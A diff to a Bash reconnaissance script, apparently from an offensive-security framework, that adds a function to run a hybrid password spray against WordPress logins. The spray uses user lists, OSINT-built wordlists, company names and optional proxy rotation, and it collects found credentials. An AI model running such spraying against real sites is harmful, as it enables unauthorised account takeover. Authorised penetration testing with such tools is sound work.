@@ -1124,6 +1124,41 @@ _wp_brute_build_attack_wordlist() {
     [[ -s "$dest" ]]
 }
 
+# Spray: merged short+osint passwords first, then wp-brute-pro smart wordlist generation.
+_wp_brute_run_hybrid_spray() {
+    local target_url="$1"
+    local out_dir="$2"
+    local users_csv="$3"
+    local attack_wordlist="$4"
+    local company_name="$5"
+    local py_bin="${tools}/wp-brute-pro/venv/bin/python3"
+    local tool_root="${tools}/wp-brute-pro"
+    local spray_script="${SCRIPTPATH}/lib/wp_brute_hybrid_spray.py"
+
+    [[ -x "$py_bin" && -f "$spray_script" && -s "$attack_wordlist" ]] || return 1
+    [[ -n "$users_csv" ]] || return 1
+
+    local -a spray_cmd=(
+        "$py_bin" "$spray_script"
+        -u "$target_url"
+        -U "$users_csv"
+        --priority-wordlist "$attack_wordlist"
+        --scan-json "${out_dir}/scan.json"
+        --method "${WP_BRUTE_METHOD:-auto}"
+        --batch-size "${WP_BRUTE_BATCH_SIZE:-50}"
+        --delay "${WP_BRUTE_DELAY:-3}"
+        --max-passwords "${WP_BRUTE_MAX_PASSWORDS:-0}"
+        --output "$out_dir"
+        --tool-root "$tool_root"
+        --export-json "${out_dir}/reconftw_export.json"
+    )
+    [[ -n "$company_name" ]] && spray_cmd+=(--company "$company_name")
+    [[ ${WP_BRUTE_CRAWL:-true} == true ]] && spray_cmd+=(--crawl)
+    [[ -n "${WP_BRUTE_PROXY_LIST:-}" && -s "${WP_BRUTE_PROXY_LIST}" ]] && spray_cmd+=(--proxy-list "${WP_BRUTE_PROXY_LIST}")
+
+    WP_BRUTE_TOOL_ROOT="$tool_root" run_command "${spray_cmd[@]}"
+}
+
 # Run wp-brute-pro scanner only (phase 1) and write JSON.
 _wp_brute_run_recon() {
     local target_url="$1"
@@ -1223,29 +1258,10 @@ function wp_brute_pro() {
                 "$target_url" "${users_csv:-auto}" "$wp_version" "$xmlrpc_status" "$waf_name" \
                 | anew -q "$summary_file"
 
-            local -a brute_cmd=(
-                "$py_bin" "${tool_root}/wp_brute.py"
-                -u "$target_url"
-                --method "${WP_BRUTE_METHOD:-auto}"
-                --batch-size "${WP_BRUTE_BATCH_SIZE:-50}"
-                --delay "${WP_BRUTE_DELAY:-3}"
-                --max-passwords "${WP_BRUTE_MAX_PASSWORDS:-0}"
-                --wordlist "$attack_wordlist"
-                --output "$out_dir"
-                --export-json "${out_dir}/reconftw_export.json"
-                --no-scan
-                --no-color
-                --lang "${WP_BRUTE_LANG:-en}"
-                -v
-            )
-            if [[ ${WP_BRUTE_CRAWL:-true} == true ]]; then
-                brute_cmd+=(--crawl --company "$company_name")
-            fi
-            [[ -n "$users_csv" ]] && brute_cmd+=(-U "$users_csv")
-            [[ -n "${WP_BRUTE_PROXY_LIST:-}" && -s "${WP_BRUTE_PROXY_LIST}" ]] && brute_cmd+=(--proxy-list "${WP_BRUTE_PROXY_LIST}")
-
-            _print_msg INFO "Running: wp-brute-pro password spray on ${target_url} (users: ${users_csv:-auto}, wordlist: ${attack_wordlist})"
-            run_command "${brute_cmd[@]}" >>"$LOGFILE" 2>&1 || true
+            local wordlist_count
+            wordlist_count=$(wc -l <"$attack_wordlist" | tr -d ' ')
+            _print_msg INFO "Running: wp-brute hybrid spray on ${target_url} (${wordlist_count} priority + smart generation, users: ${users_csv})"
+            _wp_brute_run_hybrid_spray "$target_url" "$out_dir" "$users_csv" "$attack_wordlist" "$company_name" >>"$LOGFILE" 2>&1 || true
 
             if [[ -s "${out_dir}/found.txt" ]]; then
                 cat "${out_dir}/found.txt" | anew -q "vulns/wp_brute/found.txt"
